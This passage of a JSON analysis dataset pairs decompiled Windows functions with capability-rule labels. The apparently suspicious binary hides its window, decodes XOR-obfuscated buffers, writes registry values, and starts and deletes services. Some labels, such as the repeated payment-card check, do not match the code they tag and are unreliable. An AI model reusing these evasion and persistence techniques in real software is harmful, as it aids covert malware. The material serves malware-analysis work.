}\n    if ((arg_8h[0xf] + arg_8h)[0x16] != 0) {\n        return in_EDX << 0x20;\n    }\n    if (arg_8h[0xf] < 0x81) {\n        return in_EDX << 0x20;\n    }\n    uVar6 = arg_8h[0xf];\n    bVar13 = uVar6 == 0xc0;\n    if (uVar6 < 0xc0) {\n        bVar13 = uVar6 == 0x80;\n    }\n    puVar8 = &stack0xfffffffc;\n    if ((!bVar13) && (puVar8 = &stack0xfffffffc,  bVar13)) {\n        puVar11 = &stack0xffffffe4;\n        puVar8 = &stack0xffffffe4;\n        cVar1 = '\\x10';\n        do {\n            puVar12 = puVar12 + -1;\n            puVar11 = puVar11 + -1;\n            *puVar11 = *puVar12;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    uVar14 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(*(puVar8 + -4));\n    pcVar2 = _sym.imp.MSVCRT.dll_rand;\n    iVar4 = uVar14;\n    *(puVar8 + -8) = iVar4;\n    if (iVar4 == 0) {\n        return uVar14 & 0xffffffff00000000;\n    }\n    uVar6 = *(puVar8 + -4);\n    uVar9 = 0;\n    bVar13 = false;\n    uVar5 = uVar6;\n    if (uVar6 != 0) {\n        do {\n            bVar13 = (POPCOUNT(uVar5 & 0xff) & 1U) == 0;\n            if ((bVar13) || (!bVar13)) {\n                iVar4 = (*pcVar2)();\n            }\n            iVar7 = iVar4 % 0xff;\n            iVar4 = *(puVar8 + -8);\n            uVar10 = uVar9 + 1;\n            bVar13 = SBORROW4(uVar10, uVar6);\n            *(uVar9 + iVar4) = iVar7;\n            uVar9 = uVar10;\n            uVar5 = uVar10 - uVar6;\n        } while (uVar10 < uVar6);\n    }\n    if ((!bVar13) && (bVar13)) {\n        *puStack24187 = uStack24159;\n        return CONCAT44(uStack24167, uStack24159);\n    }\n    puVar11 = *(puVar8 + -8);\n    puVar12 = *(puVar8 + 8) + 0x80;\n    for (uVar5 = uVar6 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar12 = *puVar11;\n        puVar11 = puVar11 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar12 = *puVar11;\n        puVar11 = puVar11 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(*(puVar8 + -8));\n    return CONCAT44(extraout_EDX, 1);\n}\n",
        "token_count": 1351
    },
    "00403420": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403473) overlaps instruction at (ram,0x00403470)\n// \n\nuint __cdecl fcn.00403420(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, arg_8h);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 298
    },
    "00403510": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403510(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.004035b0(&var_68h, &var_4h);\n    fcn.00401ce0(&var_68h, var_4h, 0x407494, 0xa180);\n    *arg_8h = 0x407494;\n    *arg_ch = 0xa180;\n    return;\n}\n",
        "token_count": 237
    },
    "00403b40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403c3a) overlaps instruction at (ram,0x00403c39)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00403c2c)\n// WARNING: Removing unreachable block (ram,0x00403c36)\n// WARNING: Removing unreachable block (ram,0x00403ba1)\n// WARNING: Removing unreachable block (ram,0x00403c3a)\n\nvoid __cdecl fcn.00403b40(uchar *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    char cVar3;\n    char *in_EAX;\n    uint uVar2;\n    ushort in_CX;\n    uint uVar4;\n    uint16_t uVar5;\n    uint32_t in_EDX;\n    uint32_t uVar6;\n    int32_t unaff_EBX;\n    uint *puVar7;\n    uint *puVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t unaff_ESI;\n    char *unaff_EDI;\n    char *pcVar11;\n    ushort in_ES;\n    ushort in_SS;\n    bool bVar12;\n    bool bVar13;\n    bool bVar14;\n    bool bVar15;\n    uchar auStack24187 [24167];\n    uint auStack20 [2];\n    \n    puVar7 = &stack0xfffffffc;\n    bVar12 = (unaff_ESI | 0x561b) < in_EDX;\n    *arg_8h = 0xde;\n    bVar15 = SCARRY4(unaff_EBX, 1);\n    bVar14 = unaff_EBX + 1 < 0;\n    bVar13 = unaff_EBX == -1;\n    arg_8h[1] = 0x40;\n    if ((bVar15 == bVar14) && (bVar15 != bVar14)) {\n        in_SS = unaff_ESI;\n        arg_8h = arg_8h + -1;\n        pcVar11 = unaff_EDI | &stack0xfffffffc;\n        unaff_EDI = pcVar11 + 1;\n        *pcVar11 = in_EAX;\n        bVar12 = false;\n        bVar15 = false;\n        uVar5 = in_EAX + (in_EAX >> 8) * 'y';\n        in_EAX = in_EAX & 0xffff0000 | uVar5;\n        bVar14 = false;\n        bVar13 = uVar5 == 0;\n    }\n    arg_8h[2] = 0x2d;\n    if ((!bVar12 && !bVar13) && (bVar12 || bVar13)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_8h[3] = 0x9a;\n    puVar10 = &stack0xfffffffc;\n    if ((!bVar13) && (puVar10 = &stack0xfffffffc,  bVar13)) {\n        puVar8 = auStack20 + 1;\n        puVar10 = auStack20 + 1;\n        cVar1 = '\\x10';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *puVar7;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    arg_8h[4] = 0x69;\n    if (((!bVar13) && (bVar13)) || (arg_8h[5] = 0xa7,  bVar15 == bVar14)) {\n        unaff_EDI = CONCAT22(in_CX, in_SS);\n        in_EAX = in_EAX + 0xf8c0fa7;\n        *in_EAX = *in_EAX + in_EAX;\n        pcVar11 = arg_8h + 0x51;\n        cVar1 = *pcVar11;\n        cVar3 = in_EAX >> 8;\n        *pcVar11 = *pcVar11 + cVar3;\n        if (SCARRY1(cVar1, cVar3) != *pcVar11 < '\\0') goto code_r0x00403be8;\n    }\n    arg_8h[6] = 0x1d;\n    in_EAX = in_EAX & 0xffffff00 | in_EAX - 1;\ncode_r0x00403be8:\n    puVar9 = auStack24187 ^ *(unaff_EBX + -0x3a);\n    *(puVar9 + -1) = in_ES;\n    *unaff_EDI = arg_8h + -0x50;\n    uVar6 = puVar9[-1];\n    uVar4 = *puVar9;\n    uVar2 = puVar9[1];\n    in_EAX[8] = -0x69;\n    *(puVar9 + 6) = uVar6;\n    uVar5 = *(puVar9 + 6);\n    in_EAX[9] = 'D';\n    puVar9[1] = uVar4;\n    *puVar9 = uVar6 & 0xffff0000 | uVar5;\n    uVar4 = *puVar9;\n    in_EAX[10] = -0x21;\n    puVar9[1] = uVar2;\n    *puVar9 = uVar4;\n    uVar2 = puVar9[1];\n    in_EAX[0xb] = 'X';\n    puVar9[1] = uVar2;\n    **(puVar10 + 0xc) = 0xb;\n    return;\n}\n",
        "token_count": 1279
    },
    "00403ec0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403ec0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x407490, 0x42365c, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 139
    },
    "004011c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004011c0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "004011f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040127f) overlaps instruction at (ram,0x0040127a)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00401237)\n// WARNING: Removing unreachable block (ram,0x00401220)\n// WARNING: Removing unreachable block (ram,0x0040122c)\n// WARNING: Removing unreachable block (ram,0x00401235)\n// WARNING: Removing unreachable block (ram,0x004011c5)\n// WARNING: Removing unreachable block (ram,0x0040125f)\n// WARNING: Removing unreachable block (ram,0x00401273)\n// WARNING: Removing unreachable block (ram,0x00401279)\n\nbool fcn.004011f0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    pcbData = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x407460, 0x407488, &pdwType, &pvData, &pcbData);\n    if (iVar2 != 0) {\n        return false;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 506
    },
    "00401fb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401ff5) overlaps instruction at (ram,0x00401ff0)\n// \n\nbool fcn.00401fb0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    char *pcVar5;\n    bool bVar6;\n    ulong uVar7;\n    int32_t iStack8;\n    \n    iStack8 = 0;\n    uVar7 = fcn.00403420(&iStack8);\n    bVar6 = (POPCOUNT(uVar7 & 0xff) & 1U) != 0;\n    if (uVar7 == 0) {\n        return false;\n    }\n    iVar2 = iStack8;\n    puVar4 = &stack0xfffffffc;\n    if ((bVar6) && (puVar4 = &stack0xfffffffc,  !bVar6)) {\n        iVar2 = (uVar7 >> 0x20) + 1;\n        puVar4 = *0x8b17b43a + 1;\n    }\n    if (iVar2 == 0) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar5 = *(puVar4 + -4);\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x407218, 1, *(puVar4 + -4), ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 411
    },
    "00402cf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402d07) overlaps instruction at (ram,0x00402d04)\n// \n\nuint __cdecl fcn.00402cf0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uchar *unaff_ESI;\n    bool in_ZF;\n    bool bVar2;\n    unkbyte6 Var3;\n    uint var_4h;\n    \n    if ((!in_ZF) && (in_ZF)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *0x423628 = fcn.00402ba0();\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    Var3 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h, &var_4h, 0);\n    bVar2 = Var3 == 0;\n    if (bVar2) {\n        return 0;\n    }\n    if ((!bVar2) && (bVar2)) {\n        out(*unaff_ESI, Var3 >> 0x20);\n    }\n    if (*0x423628 != 0) {\n        iVar1 = fcn.00402c20(arg_8h_00);\n        *0x423628 = iVar1 == 0;\n    }\n    fcn.00402e00(0, arg_8h_00);\n    if (*0x423628 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n    }\n    return 1;\n}\n",
        "token_count": 440
    },
    "00402fd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nulong __cdecl fcn.00402fd0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    bool bVar4;\n    \n    uVar3 = 0;\n    bVar4 = false;\n    if (arg_ch != 0) {\n        do {\n            if ((!bVar4) && (bVar4)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            in_EAX = iVar1 / 0x1a;\n            uVar2 = iVar1 % 0x1a + 0x61;\n            in_EDX = iVar1 % 0x1a & 0xffffff00U | uVar2;\n            *(uVar3 + arg_8h) = uVar2;\n            uVar3 = uVar3 + 1;\n            bVar4 = SBORROW4(uVar3, arg_ch);\n        } while (uVar3 < arg_ch);\n    }\n    return CONCAT44(in_EDX, in_EAX);\n}\n",
        "token_count": 287
    },
    "00403750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403750(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401e20(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "004039b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004039b0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00403c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403cb2) overlaps instruction at (ram,0x00403cae)\n// \n// WARNING: Removing unreachable block (ram,0x00403ca5)\n\nvoid __cdecl fcn.00403c80(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403b40(&var_68h, &var_4h);\n    fcn.00401ce0(&var_68h, var_4h, 0x411614, 0x12000);\n    *arg_8h = 0x411614;\n    *arg_ch = 0x12000;\n    return;\n}\n",
        "token_count": 285
    },
    "00404510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004045f3) overlaps instruction at (ram,0x004045f2)\n// \n\nvoid fcn.00404510(uint param_1)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    char extraout_CL;\n    char extraout_CH;\n    uint16_t extraout_CX;\n    ushort extraout_CX_00;\n    int32_t extraout_ECX;\n    uint8_t extraout_CH_00;\n    uint8_t uVar3;\n    int32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    uint8_t extraout_DL;\n    char extraout_DH;\n    int32_t extraout_EDX;\n    uint8_t extraout_DH_00;\n    uint8_t extraout_DH_01;\n    int32_t extraout_EDX_00;\n    uint8_t *unaff_EBX;\n    uint32_t uVar4;\n    int32_t unaff_ESI;\n    uint8_t *unaff_EDI;\n    uchar in_CF;\n    bool bVar5;\n    uchar uVar6;\n    bool bVar7;\n    char cVar8;\n    char cVar9;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    int32_t iVar10;\n    uint arg_14h;\n    uint *puVar11;\n    uint uVar12;\n    uint arg_14h_00;\n    \n    fcn.00403920(0x423614, 8, 0x407010, 0x11);\n    if ((in_CF) || (iVar10 = extraout_EDX,  !in_CF)) {\n        iVar10 = 0xf;\n        in_stack_ffffffdc = 0x40722c;\n        in_stack_ffffffd8 = 8;\n    }\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n    *(extraout_EDX + 8) = *(extraout_EDX + 8) + extraout_CH;\n    fcn.00403920(0x423614, in_stack_ffffffd8, in_stack_ffffffdc, iVar10);\n    cVar8 = (extraout_CX | 0x31fd) < 0;\n    arg_14h_00 = 0x1a;\n    uVar12 = 0x40723c;\n    puVar11 = 0x8;\n    do {\n        arg_14h = 0x404582;\n        fcn.00403920(0x423614, puVar11, uVar12, arg_14h_00);\n        if ((cVar8) || (!cVar8)) {\n            arg_14h = 10;\n        }\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        fcn.00403920(0x423614, 8, 0x407290, arg_14h);\n        fcn.00403920(0x423614, 8, 0x40729c, 0xb);\n        cVar9 = SBORROW1(extraout_DH, extraout_CL);\n        cVar8 = extraout_DH - extraout_CL < '\\0';\n        bVar5 = extraout_DH == extraout_CL;\n        arg_14h_00 = 0x4072a8;\n        uVar12 = 8;\n        puVar11 = 0x423614;\n        fcn.00403920(0x423614, 8, 0x4072a8, 8);\n        if ((bVar5 || cVar9 != cVar8) || (iVar10 = extraout_ECX,  !bVar5 && cVar9 == cVar8)) {\n            fcn.00403920(0x423614, 8, 0x4072b0, 9);\n            cVar9 = false;\n            uVar3 = extraout_CH_00 | extraout_DL | 0x1f;\n            cVar8 = uVar3 < '\\0';\n            uVar6 = uVar3 == 0;\n            arg_14h_00 = 0x4072bc;\n            uVar12 = 8;\n            puVar11 = 0x423614;\n            fcn.00403920(0x423614, 8, 0x4072bc, 9);\n            if ((!cVar9) && (cVar9)) {\n                *puVar11 = param_1;\n                return;\n            }\n            fcn.00403920(0x423614, 8, 0x4072c8, 9);\n            if ((uVar6 || cVar9 != cVar8) || (!uVar6 && cVar9 == cVar8)) {\n                fcn.00403920(0x423614, 8, 0x4072d4, 0xc);\n                fcn.00403920(0x423614, 8, 0x4072e0, 3);\n                fcn.00403920(0x423614, 8, 0x4072e4, 10);\n                iVar2 = fcn.00403920(0x423614, 8, 0x4072f0, 0x40);\n                bVar5 = SBORROW1((unaff_EBX ^ 0x70c5) - iVar2 >> 8 | extraout_CX_00 >> 8, extraout_CX_00);\n                uVar12 = 0x40473e;\n                fcn.00403920(0x423614, 8, 0x407330, 0xc);\n                if ((bVar5) || (!bVar5)) {\n                    uVar12 = 0xb;\n                }\n                bVar5 = false;\n                bVar7 = (extraout_ECX_01 & *(extraout_ECX_01 + 0x87cb1757)) == 0;\n                fcn.00403920(0x423614, 8, 0x40733c, uVar12);\n                if ((!bVar5 && !bVar7) && (bVar5 || bVar7)) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n                fcn.00403920(0x423614, 8, 0x407348, 4);\n                uVar4 = (unaff_EBX >> 8 & 0xffff00) << 8 | unaff_EBX & 0xffff;\n                fcn.00403920(0x423614, 8, 0x40734c, 4);\n                bVar5 = (unaff_EBX & 0xffff) >> 8 < extraout_DH_01;\n                uVar6 = SBORROW2(unaff_EDI, 1);\n                uVar12 = 0xc;\n                fcn.00403920(0x423614, 8, 0x407350, 0xc);\n                if ((!bVar5) && (bVar5)) {\n                    piVar1 = uVar4 + 0x69 + extraout_EDX_00 * 4;\n                    uVar6 = SCARRY4(uVar4, *piVar1) != SCARRY4(uVar4 + *piVar1, bVar5);\n                }\n                puVar11 = 0x423614;\n                fcn.00403920(0x423614, 8, 0x40735c, 4);\n                if ((!uVar6) && (uVar6)) {\n                    *puVar11 = uVar12;\n                    return;\n                }\n                fcn.00403920(0x423614, 8, 0x407360, 9);\n                fcn.00403920(0x423614, 8, 0x40736c, 0x16);\n                fcn.00403920(0x423614, 8, 0x407384, 7);\n                return;\n            }\n            if (extraout_ECX_00 != 0) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            *unaff_EDI = *unaff_EDI | extraout_DH_00;\n            cVar8 = *unaff_EDI < '\\0';\n            iVar10 = extraout_ECX_00;\n        }\n        if (iVar10 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    } while( true );\n}\n",
        "token_count": 1909
    },
    "00404d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404d7c) overlaps instruction at (ram,0x00404d77)\n// \n\nint32_t __cdecl fcn.00404d10(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint8_t extraout_CL;\n    bool in_OF;\n    \n    if ((!in_OF) && (in_OF)) {\n        LOCK();\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n        *(iVar1 + 0x5339da56) = *(iVar1 + 0x5339da56) ^ extraout_CL;\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 211
    },
    "00404ec0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404ec0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00401ce0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d2a) overlaps instruction at (ram,0x00401d25)\n// \n\nvoid __thiscall fcn.00401ce0(uint8_t param_1, uint param_2, uint param_3, int32_t param_4, int32_t param_5)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uchar *puVar3;\n    uint32_t uVar4;\n    \n    puVar3 = &stack0xfffffffc;\n    uVar4 = 0;\n    if (param_5 != 0) {\n        do {\n            uVar1 = *(puVar3 + 8);\n            uVar2 = *(uVar4 + param_4) ^ *(uVar4 % *(puVar3 + 0xc) + uVar1);\n            if ((uVar2 < '\\x01') || ('\\0' < uVar2)) {\n                uVar1 = *(puVar3 + 0x14);\n                *(uVar4 + param_4) = uVar2;\n            }\n            else {\n                *(uVar1 + 0x8b39da56) = *(uVar1 + 0x8b39da56) ^ param_1;\n                puVar3 = puVar3 + 1;\n                uVar1 = uVar1 & 0xffffff00 | (uVar1 + 0x4a) - (0x77 < uVar1);\n            }\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < uVar1);\n    }\n    return;\n}\n",
        "token_count": 357
    },
    "00403920": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403920(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t *unaff_EDI;\n    int32_t *piVar1;\n    bool bVar2;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    piVar1 = unaff_EDI;\n    if (0 < arg_14h) {\n        do {\n            bVar2 = SBORROW2(piVar1, 1);\n            piVar1 = piVar1 & 0xffff;\n            if (!bVar2) {\n                if (bVar2) {\n                    *unaff_EDI = arg_ch;\n                    return;\n                }\n            }\n            *(var_4h + arg_10h) = arg_14h ^ *(var_4h + arg_10h) ^ *(var_4h % arg_ch + arg_8h);\n            var_4h = var_4h + 1;\n        } while (var_4h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "004027e0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.004027e0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x40721c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 81
    },
    "00402750": {
        "rules": [
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402750(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 241
    }
}